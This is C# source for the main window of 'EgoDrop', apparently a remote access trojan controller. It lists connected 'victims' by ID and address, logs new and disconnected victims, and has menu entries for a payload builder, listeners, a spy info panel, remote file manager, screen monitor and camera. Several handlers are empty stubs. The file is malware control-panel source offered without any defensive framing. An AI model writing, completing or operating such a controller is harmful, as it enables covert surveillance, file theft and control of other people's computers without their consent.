using System.Net.Sockets;

namespace EgoDrop
{
    public partial class frmMain : Form
    {
        public Dictionary<string, clsListener> m_dicListener = new Dictionary<string, clsListener>();

        private clsSqlite m_sqlite { get; set; }
        private clsIniMgr m_iniMgr { get; set; }

        public frmMain()
        {
            InitializeComponent();

            m_sqlite = new clsSqlite("data.db");
            m_iniMgr = new clsIniMgr("config.ini");
        }

        private clsVictim fnGetVictimFromTag(ListViewItem item) => (clsVictim)item.Tag;

        #region Logger

        public void fnSysLog(string szMsg)
        {
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
            richTextBox1.AppendText(Environment.NewLine);
        }

        #endregion

        public void fnOnNewVictim(clsListener ltn, clsVictim vic)
        {
            Socket sktClnt = vic.m_sktClnt;
            try
            {
                Invoke(new Action(() =>
                {
                    
                }));
            }
            catch (Exception ex)
            {

            }
        }

        public void fnReceivedMessage(clsListener ltn, clsVictim victim, List<string> lsMsg)
        {
            if (lsMsg.Count == 0)
                return;

            if (victim == null || victim.m_sktClnt == null || victim.m_sktClnt.RemoteEndPoint == null)
                return;

            if (lsMsg[0] == "info")
            {
                Invoke(new Action(() =>
                {
                    string szID = lsMsg[4];
                    if (listView1.Items.Count == 0 || listView1.FindItemWithText(szID, true, 0) == null)
                    {
                        ListViewItem item = new ListViewItem(lsMsg[1]);
                        item.SubItems.Add(szID);
                        item.SubItems.Add(victim.m_sktClnt.RemoteEndPoint.ToString());
                        item.SubItems.Add(lsMsg[3]);
                        item.SubItems.Add(lsMsg[5]);
                        item.SubItems.Add(lsMsg[6]);
                        item.SubItems.Add(lsMsg[7]);
                        item.SubItems.Add(lsMsg[8]);

                        item.Tag = victim;

                        listView1.Items.Add(item);

                        fnSysLog($"New victim[{victim.m_sktClnt.RemoteEndPoint.ToString()}]");
                    }
                }));
            }
        }

        public void fnOnVictimDisconnected(clsListener ltn, clsVictim vic)
        {
            if (vic == null || vic.m_sktClnt == null || vic.m_sktClnt.RemoteEndPoint == null)
                return;

            Invoke(new Action(() =>
            {
                foreach (ListViewItem item in listView1.Items)
                {
                    if (clsTools.fnbSameVictim(vic, fnGetVictimFromTag(item)))
                    {
                        listView1.Items.Remove(item);
                        fnSysLog($"Offline[{vic.m_sktClnt.RemoteEndPoint.ToString()}]");
                    }
                }
            }));
        }

        private void fnSetup()
        {
            //Load groups
            List<string> lsGroup = m_sqlite.fnlsGetGroups();
            foreach (string szName in lsGroup)
            {
                TreeNode node = new TreeNode(szName);
                treeView1.Nodes.Add(node);
            }
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Listener
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            frmListener f = new frmListener(this, m_sqlite, m_dicListener);

            f.ShowDialog();
        }

        //Builder
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            frmBuilder f = new frmBuilder(this, m_sqlite, m_iniMgr);
            f.Show();
        }

        //Setting
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            frmSetting f = new frmSetting();

            f.ShowDialog();
        }

        //About
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            new frmAbout().Show();
        }
        //Info
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmInfoSpyder f = new frmInfoSpyder(fnGetVictimFromTag(item));
                f.Show();
            }
        }
        //File
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmFileMgr f = new frmFileMgr(fnGetVictimFromTag(item));
                f.Show();
            }
        }
        //Process
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {

        }
        //Service
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {

        }
        //Monitor
        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                
            }
        }
        //Camera
        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            frmCamera f = new frmCamera();

            f.Show();
        }
    }
}
